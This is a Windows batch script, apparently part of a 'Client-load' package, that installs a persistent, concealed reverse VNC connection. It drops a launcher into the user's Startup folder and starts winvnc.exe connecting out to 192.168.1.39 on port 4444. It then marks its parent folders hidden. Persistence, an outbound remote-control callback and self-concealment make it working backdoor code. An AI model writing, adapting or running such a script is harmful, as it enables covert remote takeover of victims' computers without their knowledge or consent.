@echo off

REM Determine the directory where this batch file is located
set script_dir=%~dp0

REM Create the batch file for startup folder (startup_winvnc.bat)
(
  echo @echo off
  echo timeout /t 1 >nul
  echo cd /d "%script_dir%"
  echo call "%script_dir%run_winvnc.bat"
) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat"

REM Create the batch file to run winvnc.exe (run_winvnc.bat)
(
  echo @echo off
  echo start winvnc.exe -run
  echo timeout /t 1 >nul
  echo winvnc.exe -connect 192.168.1.39::4444
) > "%script_dir%run_winvnc.bat"

REM Function to check if winvnc.exe has permissions
:CheckPermissions
echo Checking permissions for winvnc.exe...
REM Wait for winvnc.exe to have permissions (check every 2 seconds)
:loop
timeout /t 2 >nul
tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
if errorlevel 1 (
  goto loop
) else (
  echo winvnc.exe has permissions. Starting run_winvnc.bat...
  call "%script_dir%run_winvnc.bat"
)

REM Hide the extracted Client-load folder and its parent folder
attrib +h "%script_dir%\.."
attrib +h "%script_dir%\..\.."

REM Display a completion message
echo.
echo Startup setup completed. Parent folders hidden.

REM End of main.bat
